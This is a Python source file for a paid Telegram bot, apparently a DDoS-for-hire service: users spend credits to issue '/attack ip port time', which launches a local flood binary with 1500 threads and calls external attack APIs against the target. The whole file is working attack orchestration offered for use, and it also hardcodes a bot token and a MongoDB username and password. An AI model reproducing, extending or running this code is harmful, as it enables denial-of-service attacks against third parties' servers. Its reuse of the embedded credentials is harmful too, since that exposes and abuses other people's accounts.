import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500 
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    api_collection = db.apis 
    admins_collection = db.admins 
    settings_collection = db.settings 
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# Global Variables
active_attacks = [] 
attack_lock = Lock()
DEFAULT_THREADS = 1500 

# --- SETTINGS LOADER ---
def get_settings():
    settings = settings_collection.find_one({"id": "bot_settings"})
    if not settings:
        default = {"id": "bot_settings", "max_time": 300, "total_slots": 1}
        settings_collection.insert_one(default)
        return default
    return settings

# --- PERMISSION HELPERS ---
def get_user_role(user_id):
    if user_id == PRIMARY_ADMIN: return "owner"
    admin_data = admins_collection.find_one({"user_id": user_id})
    return admin_data.get("role") if admin_data else "user"

# --- ATTACK ENGINE ---
async def run_slotted_attack(chat_id, target_ip, target_port, duration, attack_id):
    global active_attacks
    binary_cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {target_ip} {target_port} {duration} {DEFAULT_THREADS}"
    
    for api in list(api_collection.find()):
        try: 
            # API Trigger Logic
            requests.get(f"https://{api['url']}/api?key={api['key']}&host={target_ip}&port={target_port}&time={duration}", timeout=4)
        except: pass

    try:
        process = subprocess.Popen(binary_cmd, shell=True)
        await asyncio.sleep(duration)
        process.terminate()
    finally:
        with attack_lock:
            if attack_id in active_attacks:
                active_attacks.remove(attack_id)
        bot.send_message(chat_id, f"*✅ Attack Finished!*\n🎯 `{target_ip}:{target_port}`", parse_mode='Markdown')

# --- ATTACK COMMAND WITH INSTANT SYNTAX CHECK ---
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    settings = get_settings()

    # Basic Credit Check
    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Need 5 credits!*", parse_mode='Markdown')
        return

    # Slot Check
    with attack_lock:
        if len(active_attacks) >= settings['total_slots']:
            bot.send_message(message.chat.id, "⚠️ *All Slots Full!*", parse_mode='Markdown')
            return

    # Syntax Logic Improvement
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(
            message.chat.id, 
            "❌ *Invalid Syntax!*\n\n*Usage:* `/attack <ip> <port> <time>`", 
            parse_mode='Markdown'
        )
        return

    try:
        ip, port, dur = args[1], int(args[2]), int(args[3])
        
        if dur > settings['max_time']:
            bot.send_message(message.chat.id, f"❌ *Max time is {settings['max_time']}s!*", parse_mode='Markdown')
            return

        # Deduct 5 credits
        users_collection.update_one({"user_id": user_id}, {"$inc": {"credits": -5}})
        
        attack_id = f"{ip}_{port}_{time.time()}"
        with attack_lock:
            active_attacks.append(attack_id)

        bot.send_message(message.chat.id, f"🚀 *Launched!*\n🎯 `{ip}:{port}`\n⏳ `{dur}s`", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_slotted_attack(message.chat.id, ip, port, dur, attack_id), attack_loop)
    
    except Exception as e:
        bot.send_message(message.chat.id, "❌ *Error:* Provide valid IP, Port and Time.", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🌍 *Bot Online!*\nUse `/attack ip port time` to launch.", parse_mode='Markdown')

def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()
